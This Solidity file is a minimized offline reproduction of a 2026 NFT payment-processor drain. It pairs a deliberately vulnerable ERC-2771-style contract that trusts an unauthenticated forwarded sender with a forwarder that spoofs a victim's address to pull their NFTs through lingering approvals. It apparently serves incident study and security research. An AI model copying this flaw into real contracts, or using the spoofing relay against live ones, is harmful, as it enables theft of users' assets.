// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Minimized OFFLINE reproduction of the Magic Eden / Limit Break "Payment Processor V2" drain
// (2026-09-24, ~$2.8M across chains; WETH + NFTs, Ethereum/Polygon/Base/...). Authored in THIS repo
// (MIT). This is NOT a copy of the on-chain Payment Processor bytecode and NOT a copy of any
// third-party PoC (write-ups / DeFiHackLabs are reference for FACTS only; their code is not
// vendored). The documented MECHANISM is reproduced from authoritative write-ups; see
// ./magic-eden-pp2-victim/PROVENANCE.md for the incident facts (attacker, contract, pinned tx hash,
// on-chain verification, sources).
//
// Root cause (per The Block / Revoke.cash / 0xQuit / Cryptotimes): Payment Processor V2 handled
// meta-transactions via an ERC-2771-style trusted-forwarder pattern. The contract derived the
// acting party from an address appended to calldata by an approved forwarder, and TRUSTED that
// appended address without authenticating that the forwarder had actually verified it. So anyone
// routing a call through the trusted forwarder could SPOOF the sender to be any victim. Magic Eden
// used the contract in 2024, so many wallets still had a standing `setApprovalForAll(processor, true)`
// (and WETH approvals) from listing. The attacker spoofed a victim as the counterparty who "agreed"
// to a zero-price trade; the processor then pulled the victim's NFT with the victim's lingering
// operator approval and delivered it to the attacker. The victim signed nothing during the attack.
// V2 was non-upgradeable with no pause, so it could not be stopped.

/// @dev Minimal ERC-721 with the operator-for-all authority model the vector turns on.
contract MeMiniERC721 {
    mapping(uint256 => address) public ownerOf;
    mapping(address => mapping(address => bool)) public isApprovedForAll;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 id) external {
        require(ownerOf[id] == address(0), "exists");
        ownerOf[id] = to;
        unchecked {
            ++balanceOf[to];
        }
    }

    function setApprovalForAll(address operator, bool approved) external {
        isApprovedForAll[msg.sender][operator] = approved;
    }

    function transferFrom(address from, address to, uint256 id) public {
        require(ownerOf[id] == from, "wrong-from");
        require(msg.sender == from || isApprovedForAll[from][msg.sender], "not-authorized");
        ownerOf[id] = to;
        unchecked {
            --balanceOf[from];
            ++balanceOf[to];
        }
    }
}

/// @notice Minimized vulnerable Payment Processor. THE FLAW: `_msgSender()` trusts an address the
///         forwarder appended to calldata without authenticating it, so a caller routing through the
///         trusted forwarder can claim to be any victim. `acceptOffer` treats that spoofed sender as
///         the owner who consented to sell and pulls their NFT via the standing operator approval.
contract PaymentProcessorClone {
    address public immutable trustedForwarder;

    constructor(address forwarder) {
        trustedForwarder = forwarder;
    }

    /// @dev ERC-2771-style sender recovery. Spoofable: the appended address is trusted blindly.
    function _msgSender() internal view returns (address signer) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            assembly {
                signer := shr(96, calldataload(sub(calldatasize(), 20)))
            }
        } else {
            signer = msg.sender;
        }
    }

    /// @dev Settle a zero-price "accepted offer": the processor believes `_msgSender()` is the seller
    ///      who agreed, and moves their NFT to `recipient` using the seller's standing operator grant.
    ///      No signature / no real consent check - the only authority is the spoofable forwarded sender.
    function acceptOffer(MeMiniERC721 collection, uint256 tokenId, address recipient) external {
        address seller = _msgSender(); // spoofed to be the victim
        collection.transferFrom(seller, recipient, tokenId);
    }
}

/// @notice The approved forwarder. In the real incident the trusted forwarder did not authenticate
///         the principal it forwarded, so the attacker could have it append an arbitrary (victim)
///         address. Modeled here as a relay that appends an attacker-chosen `fakeSender`.
contract SpoofForwarder {
    function relayAcceptOffer(
        PaymentProcessorClone processor,
        MeMiniERC721 collection,
        uint256 tokenId,
        address recipient,
        address fakeSender
    ) external {
        // Append `fakeSender` (the victim) to calldata, ERC-2771 style - unauthenticated.
        bytes memory data = abi.encodePacked(
            abi.encodeWithSelector(PaymentProcessorClone.acceptOffer.selector, collection, tokenId, recipient),
            fakeSender
        );
        (bool ok,) = address(processor).call(data);
        require(ok, "relay-failed");
    }
}
